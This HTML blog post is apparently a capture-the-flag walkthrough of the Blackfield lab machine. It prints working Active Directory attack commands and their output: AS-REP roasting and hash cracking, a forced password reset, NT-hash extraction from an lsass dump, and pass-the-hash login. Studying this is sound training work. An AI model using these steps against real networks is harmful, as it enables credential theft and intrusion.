<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>Blackfield | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Blackfield" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP" /><meta property="og:description" content="Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Blackfield/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Blackfield/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-10T19:30:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png" /><meta property="twitter:title" content="Blackfield" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Blackfield","dateModified":"2021-07-10T19:30:00+05:30","datePublished":"2021-07-10T19:30:00+05:30","image":"https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Blackfield/"},"description":"Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP","url":"https://0xcaretaker.github.io/posts/Blackfield/","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /><title>Blackfield | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Blackfield" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP" /><meta property="og:description" content="Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Blackfield/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Blackfield/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-10T19:30:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png" /><meta property="twitter:title" content="Blackfield" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Blackfield","dateModified":"2021-07-10T19:30:00+05:30","datePublished":"2021-07-10T19:30:00+05:30","image":"https://0xcaretaker.github.io/assets/img/Posts/Blackfield/Blackfield.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Blackfield/"},"description":"Enumeration Nmap ```bash $ nmap -Pn -sVC -p- -oN nmap-full.txt -v –min-rate 1000 IP","url":"https://0xcaretaker.github.io/posts/Blackfield/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">TheCaretaker</a></div><div class="site-subtitle font-italic">Penetration Tester | Ethical Hacker | CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/0xCaretaker" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xCaretaker" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['deepakdhasmana0007','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/371479" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/deepak-dhasmana/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Blackfield</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Blackfield</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jul 10, 2021, 7:30 PM +0530" > Jul 10, 2021 <i class="unloaded">2021-07-10T19:30:00+05:30</i> </span> by <span class="author"> Deepak Dhasmana </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Blackfield/Blackfield.png" class="post-preview-img"><h1 id="enumeration">Enumeration</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-Pn</span> <span class="nt">-sVC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmap-full.txt <span class="nt">-v</span> <span class="nt">--min-rate</span> 1000 <span class="sb">`</span>IP<span class="sb">`</span>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-06-13 22:53:17Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2021-06-13T22:53:32
|_  start_date: N/A
</pre></table></code></div></div><p>Domain name: <code class="language-plaintext highlighter-rouge">BLACKFIELD.local</code></p><h2 id="dns">DNS</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>dig ANY @<span class="sb">`</span>IP<span class="sb">`</span> BLACKFIELD.local

<span class="p">;;</span> ANSWER SECTION:
BLACKFIELD.local.       600     IN      A       10.10.10.192
BLACKFIELD.local.       3600    IN      NS      dc01.BLACKFIELD.local.
BLACKFIELD.local.       3600    IN      SOA     dc01.BLACKFIELD.local. hostmaster.BLACKFIELD.local. 149 900 600 86400 3600
</pre></table></code></div></div><p>Other domain-names: <code class="language-plaintext highlighter-rouge">dc01.BLACKFIELD.local</code> , <code class="language-plaintext highlighter-rouge">hostmaster.BLACKFIELD.local</code>.</p><h2 id="kerberos">Kerberos</h2><p>Enumerating users with kerbrute gives:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> BLACKFIELD.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <span class="nt">--dc</span> <span class="sb">`</span>IP<span class="sb">`</span>

2021/06/13 21:48:25 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       support@BLACKFIELD.local
2021/06/13 21:50:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       guest@BLACKFIELD.local
2021/06/13 22:01:31 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       administrator@BLACKFIELD.local
</pre></table></code></div></div><p>Checking for AS-REP Roasting for those users:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>GetNPUsers.py <span class="s1">'BLACKFIELD.local/'</span> <span class="nt">-usersfile</span> <span class="nb">users</span> <span class="nt">-dc-ip</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-format</span> john <span class="nt">-outputfile</span> hashes.asreproast

Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] User guest doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>

<span class="nv">$ </span><span class="nb">cat </span>hashes.asreproast
<span class="nv">$krb5asrep$support</span>@BLACKFIELD.LOCAL:c6be395079288cc668713586d1b73ac8<span class="nv">$fb919022470062fb3e1c2cfe14b7f01d7a807217bdb5a0034e7bda691a1b3395f64198949092850a91dc1ba7d41f587b37bab4effd398c5d27c4850f7d8112adba0f5eb695fccee61ba4dd18042e34ea3ff3cddc69aea3dc938a9d179b41f0bc5bcee695aad9631dd36d7b1e8d42d0f01c4e03f345901414f02af2501ba1353e16bb6cc9384b5e70fa8fe7b7e2f9724f022a17e6133342b66447cf98dae2ba353374cb26661894c631cf06a557ca9dbc8312d8a0618a4c7398b5e0f2669708e12e1e559a4a3066bb0e64b9688404de7059249048020d9df19420988901018b7065d3a9d9e54147edc65b8e4a5b425b8003c89948</span>

<span class="nv">$ </span>john hashes.asreproast <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
<span class="c">#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)</span>
Session completed
</pre></table></code></div></div><h2 id="rpc">RPC</h2><p><code class="language-plaintext highlighter-rouge">enum4linux</code> didn’t give any good results. anonymous login is possible but rpcclient doesn’t give access-denied for most of it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>rpc-command-list<span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo </span>Running <span class="nv">$i</span><span class="p">;</span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span><span class="nb">echo</span><span class="p">;</span><span class="k">done</span>  | <span class="nb">grep</span> <span class="nt">-iv</span> <span class="s1">'error\|denied\|usage'</span>
</pre></table></code></div></div><h2 id="ldap">LDAP</h2><p>Anonymous login in ldap doesn’t give much info.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-h</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=BLACKFIELD,DC=local"</span> | <span class="nb">tee </span>ldap-anonymous
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;DC=BLACKFIELD,DC=local&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

<span class="c"># search result</span>
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful <span class="nb">bind </span>must be completed on the connection., data 0, v4563

<span class="c"># numResponses: 1</span>
</pre></table></code></div></div><p>Even default nmap scripts didn’t give much info:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-p</span> 389 <span class="nt">--script</span> ldap<span class="k">*</span> <span class="sb">`</span>IP<span class="sb">`</span>
</pre></table></code></div></div><h2 id="smb">SMB</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="sb">`</span>IP<span class="sb">`</span>
Enter SMBC4R3T4K3R<span class="se">\r</span>oot<span class="s1">'s password:
dsf
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
</span></pre></table></code></div></div><p>Anonymous login is possible, we get listing of <code class="language-plaintext highlighter-rouge">profiles$</code> share, which seems to contain potential users.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-N</span> //<span class="sb">`</span>IP<span class="sb">`</span>/profiles<span class="err">$</span>
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Jun  3 22:17:12 2020
  ..                                  D        0  Wed Jun  3 22:17:12 2020
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020
  ABiemiller                          D        0  Wed Jun  3 22:17:11 2020

<span class="o">[</span>...snip...]

  ZAlatti                             D        0  Wed Jun  3 22:17:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 22:17:12 2020
  ZMalaab                             D        0  Wed Jun  3 22:17:12 2020
  ZMiick                              D        0  Wed Jun  3 22:17:12 2020
  ZScozzari                           D        0  Wed Jun  3 22:17:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020
</pre></table></code></div></div><h1 id="foothold">Foothold</h1><h2 id="rpc-1">RPC</h2><p>Using <code class="language-plaintext highlighter-rouge">support</code> account credentials for RPC we get list of some users.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'support%#00^BlackKnight'</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-c</span> <span class="s2">"enumdomusers"</span> | <span class="nb">grep</span> <span class="nt">-vi</span> blackfield
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
</pre></table></code></div></div><h2 id="bloodhound">Bloodhound</h2><p>Enumerating AD with <code class="language-plaintext highlighter-rouge">support</code> user’s credentials:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>bloodhound-python <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-c</span> ALL <span class="nt">-ns</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-d</span> BLACKFIELD.local
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 <span class="nb">users
</span>INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 <span class="nb">groups
</span>INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done <span class="k">in </span>00M 35S
</pre></table></code></div></div><p>Loading those json files in bloodhound, marking SUPPORT@BLACKFIELD.LOCAL as owned and starting node and AUDIT2020@BLACKFIELD.LOCAL as ending node gives us:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ForceChangePassword

The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user
AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current 
password.
</pre></table></code></div></div><p><a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a> shows how to reset AD password.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'support%#00^BlackKnight'</span>  <span class="sb">`</span>IP<span class="sb">`</span>
rpcclient <span class="nv">$&gt;</span> setuserinfo2 audit2020 23 <span class="s1">'Caretaker@123'</span>
</pre></table></code></div></div><h2 id="smb-1">SMB</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>smbclient //<span class="sb">`</span>IP<span class="sb">`</span>/forensic <span class="nt">-U</span> <span class="s1">'audit2020%Caretaker@123'</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 18:33:16 2020
  ..                                  D        0  Sun Feb 23 18:33:16 2020
  commands_output                     D        0  Sun Feb 23 23:44:37 2020
  memory_analysis                     D        0  Fri May 29 01:58:33 2020
  tools                               D        0  Sun Feb 23 19:09:08 2020
</pre></table></code></div></div><p>memory_analysis seems interesting, it contains a zip called lsass.zip which may contain some credentials. Downloading directly from smbclient will fail (you can use smbclient.py as an alternative). We can also mount the SMB shares:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>mount <span class="nt">-t</span> cifs //<span class="sb">`</span>IP<span class="sb">`</span>/forensic /mnt <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>audit2020,password<span class="o">=</span>Caretaker@123
</pre></table></code></div></div><p>Using something like <code class="language-plaintext highlighter-rouge">pypykatz</code>, which is Mimikatz implementation in pure Python</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>pypykatz lsa minidump lsass.DMP  <span class="nt">-o</span> lsass-dump-output

Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368

Username: DC01<span class="err">$</span>
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d

Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
</pre></table></code></div></div><p>PTH for <code class="language-plaintext highlighter-rouge">svc_backup</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-u</span> svc_backup <span class="nt">-H</span> 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
</pre></table></code></div></div><h1 id="privesc">Privesc</h1><p>User <code class="language-plaintext highlighter-rouge">svc_backup</code> has SeBackupPrivilege and SeRestorePrivilege.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
